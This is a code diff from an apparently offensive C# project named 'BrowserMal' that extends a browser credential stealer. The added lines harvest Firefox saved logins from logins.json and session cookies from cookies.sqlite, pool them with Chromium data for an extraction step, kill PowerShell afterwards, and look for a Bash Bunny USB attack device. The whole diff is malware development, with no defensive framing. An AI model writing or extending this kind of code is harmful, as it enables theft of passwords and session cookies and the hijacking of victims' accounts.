@@ -15,10 +15,13 @@ namespace BrowserMal
         public static void StartCreds()
         {
             browserManager.Init();
-            List<BrowserModel> browsers = browserManager.GetBrowsers();
+            List<BrowserModel> browsersChromium = browserManager.GetBrowsers();
 
-            Chromium(ref browsers);
-            //Gecko(ref browsers);
+            geckoBrowserManager.Init();
+            List<BrowserModel> browsersGecko = geckoBrowserManager.GetBrowsers();
+
+            Chromium(ref browsersChromium);
+            Gecko(ref browsersGecko);
 
             Extration();
             ProcessUtil.KillProcessDelayed(1, "powershell.exe");
@@ -84,15 +87,23 @@ namespace BrowserMal
 
         public static void Gecko(ref List<BrowserModel> browsers)
         {
-            List<ColumnModel> credsColumns = new List<ColumnModel>
+            GeckoManager<CredentialModel> geckoManager = new GeckoManager<CredentialModel>("logins.json", default);
+            list.AddRange(geckoManager.Init(ref browsers));
+
+            List<ColumnModel> cookiesColumn = new List<ColumnModel>
             {
-                new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("host", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("name", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("path", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("expiry", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("value", isEncrypted: false, needsFormatting: false, isImportant: true)
             };
+            GeckoManager<CookieModel> geckoCookies = new GeckoManager<CookieModel>("moz_cookies", new SqliteTableModel(cookiesColumn));
+            
+            geckoCookies.SetIsSqlite(true);
+            geckoCookies.SetFileName("cookies.sqlite");
 
-            geckoBrowserManager.Init();
-
-            GeckoManager<CredentialModel> geckoManager = new GeckoManager<CredentialModel>("logins.json", new SqliteTableModel(credsColumns));
-            geckoManager.Init(ref browsers);
+            list.AddRange(geckoCookies.Init(ref browsers));
         }
 
         private static string GetBashBunny() => RemovableDisks.FindBashBunny();
